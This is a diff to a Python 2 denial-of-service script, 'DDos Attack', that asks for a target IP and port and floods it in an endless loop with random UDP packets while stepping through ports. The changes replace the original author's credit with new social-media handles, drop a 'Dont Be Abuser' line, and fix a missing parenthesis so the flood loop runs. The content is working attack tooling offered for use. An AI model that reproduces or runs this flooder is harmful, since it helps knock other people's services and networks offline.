@@ -20,8 +20,10 @@ bytes = random._urandom(1490)
 os.system("clear")
 os.system("figlet DDos Attack")
 print
-print "Author   : Fais Adnan"
-print "Dont Be Abuser" 
+print "Author   : Tech Tushar"
+print "You Tube : https://www.youtube.com/c/TechTushar"
+print "github   : https://github.com/Techtushar07"
+print "Facebook : https://www.facebook.com/daveratushar/"
 print
 ip = raw_input("IP Target : ")
 port = input("Port       : ")
@@ -40,7 +42,7 @@ print "[====================] 100%"
 time.sleep(3)
 sent = 0
 while True:
-     sock.sendto(bytes, (ip,port)
+     sock.sendto(bytes, (ip,port))
      sent = sent + 1
      port = port + 1
      print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
